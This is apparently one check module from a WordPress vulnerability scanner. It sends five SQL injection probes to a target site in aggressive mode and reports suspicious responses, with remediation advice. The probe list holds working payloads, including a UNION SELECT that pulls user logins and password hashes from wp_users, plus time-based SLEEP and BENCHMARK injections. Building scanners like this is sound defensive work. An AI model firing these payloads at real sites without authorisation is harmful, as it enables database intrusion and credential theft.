"""#4 WP_Query / $wpdb-specific SQLi probes.

Targets WordPress-specific quirks the generic sqli check doesn't:
  - %d-formatted columns receiving non-numeric input (wpdb::prepare quirk)
  - $wpdb->prepare('LIKE %s', ...) where the value contains %% / _ / \
  - meta_query parameter pollution
  - tax_query parameter pollution
"""
from __future__ import annotations

from ..http import Client
from ..models import Finding

WP_PARAMS = (
    "?p=1' AND 1=BENCHMARK(50000000,SHA1(0))--",
    "?p=1+UNION+SELECT+1,user_login,user_pass+FROM+wp_users--",
    "?meta_key=foo&meta_value=1' UNION SELECT NULL--",
    "?cat=1+OR+SLEEP(5)",
    "?author=1+OR+SLEEP(5)",
)


async def check(client: Client, ctx: dict) -> list[Finding]:
    findings: list[Finding] = []
    step = ctx.get("step") or (lambda _s: None)
    if not ctx.get("aggressive"):
        return [Finding(severity="info", title="WP_Query SQLi probes skipped (passive mode)",
                        evidence="Pass --aggressive.", remediation="No action.", url=ctx["target"])]
    base = await client.get("/")
    base_len = len(base.content or b"") if base else 0
    base_status = base.status_code if base else 0
    hits = []
    for p in WP_PARAMS:
        step(f"WP_Query probe {p}...")
        r = await client.get("/" + p)
        if r is None:
            continue
        body = (r.text or "")[:5000].lower()
        suspicious = (r.status_code != base_status
                       or abs(len(r.content or b"") - base_len) > 500
                       or "you have an error in your sql syntax" in body
                       or "wordpress database error" in body
                       or "wpdb::query was called incorrectly" in body)
        if suspicious:
            hits.append((p, r.status_code, len(r.content or b"")))
    if not hits:
        return [Finding(severity="info", title="WP_Query SQLi probes — clean",
                        evidence=f"5 WP-specific payloads tested; none altered the response.",
                        remediation="No action.", url=ctx["target"])]
    findings.append(Finding(
        severity="high",
        title=f"WP_Query SQLi — {len(hits)} payload(s) caused suspicious response",
        evidence="\n".join(f"  - {p}  -> HTTP {s} ({sz} bytes)" for p, s, sz in hits),
        remediation="Audit `$wpdb->prepare()` calls in custom plugins / themes. Never interpolate user input into SQL without `%d` for ints + `%s` for strings. For meta_query / tax_query, use the array form, not the raw `meta_value` URL parameter.",
        url=ctx["target"],
    ))
    return findings
